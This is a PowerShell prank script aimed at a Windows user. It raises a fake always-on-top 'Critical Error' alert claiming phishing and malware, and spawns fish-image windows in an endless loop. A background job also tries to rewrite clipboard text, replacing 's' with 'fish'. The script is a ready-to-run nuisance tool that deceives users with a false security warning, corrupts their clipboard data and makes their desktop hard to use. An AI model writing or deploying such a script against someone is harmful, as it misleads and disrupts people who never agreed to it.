# Load required assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Import Windows API for always-on-top message box
$signature = @"
using System;
using System.Runtime.InteropServices;
public class MsgBox {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
}
"@
Add-Type -TypeDefinition $signature -Language CSharp

# Function to display the "error" message (ALWAYS ON TOP)
function Show-ErrorMessage {
    [MsgBox]::MessageBox([IntPtr]::Zero, "⚠️ Your system is being phished! Possible malware detected! ⚠️", "Critical Error", 0x10) # 0x10 = Error icon
}

# Function to show an enlarging fish
function Show-FishAnimation {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "🐟"
    $form.TopMost = $true
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "None"
    $form.BackColor = [System.Drawing.Color]::Black

    # Load fish image
    $pic = New-Object System.Windows.Forms.PictureBox
    $pic.Image = [System.Drawing.Image]::FromFile("$PSScriptRoot\fish.png")
    $pic.SizeMode = "StretchImage"
    $form.Controls.Add($pic)

    # Initial size
    $size = 100
    $form.Width = $size
    $form.Height = $size
    $pic.Width = $size
    $pic.Height = $size

    # Display the form
    $form.Show()

    # Enlarge from center
    for ($i = 1; $i -lt 10; $i++) {
        Start-Sleep -Milliseconds 100
        $size += 50
        $form.Width = $size
        $form.Height = $size
        $pic.Width = $size
        $pic.Height = $size
        $form.Left = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width / 2 - $size / 2
        $form.Top = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height / 2 - $size / 2
    }

    Start-Sleep -Seconds 1
    $form.Close()
}

# Function to randomly spawn fish windows
function Spawn-RandomFish {
    $fishForm = New-Object System.Windows.Forms.Form
    $fishForm.Text = "🐟"
    $fishForm.TopMost = $true
    $fishForm.StartPosition = "Manual"
    $fishForm.FormBorderStyle = "None"
    $fishForm.Width = 100
    $fishForm.Height = 100

    # Load fish image
    $pic = New-Object System.Windows.Forms.PictureBox
    $pic.Image = [System.Drawing.Image]::FromFile("$PSScriptRoot\fish.png")
    $pic.SizeMode = "StretchImage"
    $pic.Dock = "Fill"
    $fishForm.Controls.Add($pic)

    # Random position
    $fishForm.Left = Get-Random -Minimum 100 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width - 100)
    $fishForm.Top = Get-Random -Minimum 100 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height - 100)

    $fishForm.Show()
}

# Function to AutoCorrect "s" into "fish" using clipboard trick
function Start-AutoCorrect {
    while ($true) {
        Start-Sleep -Milliseconds 500
        $clip = Get-Clipboard
        if ($clip -match "s") {
            $newClip = $clip -replace "s", "fish"
            Set-Clipboard -Value $newClip
        }
    }
}

# Start AutoCorrect in a background job
Start-Job -ScriptBlock { Start-AutoCorrect }

# Start prank loop
Show-FishAnimation
while ($true) {
    Show-ErrorMessage
    Spawn-RandomFish
}
